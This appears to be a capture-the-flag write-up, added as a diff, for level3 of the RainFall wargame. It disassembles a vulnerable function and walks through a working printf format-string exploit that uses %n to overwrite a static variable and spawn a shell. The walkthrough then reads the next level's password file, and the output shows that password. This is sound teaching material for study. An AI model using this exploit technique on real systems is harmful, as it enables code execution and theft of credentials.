@@ -1,0 +1,101 @@
+# ------------------------------------------------------------------------
+# `v()' function disassembly
+# ------------------------------------------------------------------------
+
+080484a4 <v>:
+ 80484a4:	55                   	push   ebp
+ 80484a5:	89 e5                	mov    ebp,esp
+ 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
+ 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
+ 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
+ 80484bd:	00 
+ 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
+ 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
+ 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
+ 80484df:	83 f8 40             	cmp    eax,0x40
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+ 80484e4:	a1 80 98 04 08       	mov    eax,ds:0x8049880
+ 80484e9:	89 c2                	mov    edx,eax
+ 80484eb:	b8 00 86 04 08       	mov    eax,0x8048600
+ 80484f0:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
+ 80484f4:	c7 44 24 08 0c 00 00 	mov    DWORD PTR [esp+0x8],0xc
+ 80484fb:	00 
+ 80484fc:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
+ 8048503:	00 
+ 8048504:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
+ 804850c:	c7 04 24 0d 86 04 08 	mov    DWORD PTR [esp],0x804860d
+ 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
+ 8048518:	c9                   	leave  
+ 8048519:	c3                   	ret    
+
+# ------------------------------------------------------------------------
+# analysis
+# ------------------------------------------------------------------------
+
+here we notice that the function reads stdin and then immediately prints it out via `printf()' call;
+
+after the printf call the program compares the value of a static variable at `ds:0x804988c' to 0x40
+if the value is not 0x40 then the function returns to it's caller `main()',
+however if it is 0x40 then the function will print "Wait what?!\n" and launch a shell via a call to `system()'
+
+our goal is clear:
+    we need to manipulate `printf()' into changing the value of a static variable at address `ds:0x804988c'
+
+how can we do that?
+
+we know that `printf()' takes a variable number of arguments,
+
+we can make printf display the stack values just by using the %p specifier
+
+here is a sample: AAAABBBBCCCC %p %p %p %p %p %p %p %p %p
+
+    level3@RainFall:~$ ./level3 
+    AAAABBBBCCCC %p %p %p %p %p %p %p %p %p
+    AAAABBBBCCCC 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x42424242 0x43434343 0x20702520 0x25207025 0x70252070
+
+we now notice that the first four bytes of our input `AAAA' are on the stack and printf has access to those as argument 4;
+
+we learned that we can use the $ as a shortcut to specifying the argument number, for example:
+
+    level3@RainFall:~$ ./level3 
+    AAAA%4$p
+    AAAA0x41414141
+
+
+we also learned about the %n specifier for printf and its use;
+by using %n we can have printf() write the count of bytes it output onto the screen into an arbitrary memory location (variable)
+
+so, we change the previous input just a little: `AAAA%4$n'
+    we are effectively asking printf to write the value 4 into address 0x41414141
+
+in order to exploit this, we want to replace 0x41414141 with the address of the static variable 0x804988c
+and we also want to increase the number of bytes that it prints to be 64 (or 0x40 hex)
+
+we can use python for convenience:
+    python -c "print('\x08\x04\x98\x8c'[::-1] + 60 * 'A' + '%4\$n')"
+
+here we are printing the address of the static variable,
+our input's first four bytes are printf's 4th parameter
+and then we print 60 arbitrary characters 'A'
+- at this point we have output exactly 64 bytes
+next we instruct printf to write the count (64 or 0x40) into its 4th parameter: %4$n
+
+and thats our entire exploit:
+
+    level3@RainFall:~$ (python -c "print('\x08\x04\x98\x8c'[::-1] + 60 * 'A' + '%4\$n')"; cat) | ./level3 
+    ?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Wait what?!
+    whoami
+    level4
+    cat /home/user/level4/.pass
+    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+    level3@RainFall:~$ 
+        
+
+
